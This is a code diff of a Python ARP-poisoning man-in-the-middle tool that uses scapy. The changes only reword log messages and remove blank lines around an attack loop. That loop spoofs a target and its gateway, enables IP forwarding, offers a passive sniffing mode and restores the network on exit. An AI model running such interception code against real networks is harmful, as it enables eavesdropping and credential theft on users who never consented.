@@ -3,14 +3,12 @@ import scapy.all as scapy
 from . import STATUS, STOP_EVENT
 from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac
 
-
 # Helper Functions
 def get_own_mac(interface):
     try: 
         return scapy.get_if_hwaddr(interface)
     except: 
         return None
-
 
 # ARP Spoofing Core Functions
 def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
@@ -39,9 +37,9 @@ def run_attack_loop(target_ip, gateway_ip, passive=False):
         mitm_mac = get_mac(gateway_ip)
         
         if passive:
-            log_msg("[*] SILENT MODE STARTED: Passive Monitoring Only.")
+            log_msg("[*] SILENT MODE: Passive Monitoring Started")
         else:
-            log_msg("[*] ACTIVE ATTACK STARTED: ARP Poisoning Enabled.")
+            log_msg("[*] ATTACK ACTIVE: ARP Poisoning Started")
 
         while not STOP_EVENT.is_set():
             # Only send packets if NOT passive
@@ -54,13 +52,13 @@ def run_attack_loop(target_ip, gateway_ip, passive=False):
             # In silent mode, we just wait. The sniffer does the work.
             time.sleep(2)
             
-    except Exception as e: log_msg(f"ARP ERROR: {e}")
+    except Exception as e: log_msg(f"[!] ARP ERROR: {e}")
     finally:
         if not passive:
-            log_msg("[-] Stopping ARP... Restoring network.")
+            log_msg("[-] ATTACK STOPPED: Restoring network configuration...")
             restore(target_ip, gateway_ip)
         else:
-            log_msg("[-] Stopping Silent Monitor.")
+            log_msg("[-] STOPPED: Silent Monitor disabled")
             
         set_ip_forwarding(0)
         set_port_forwarding(False)
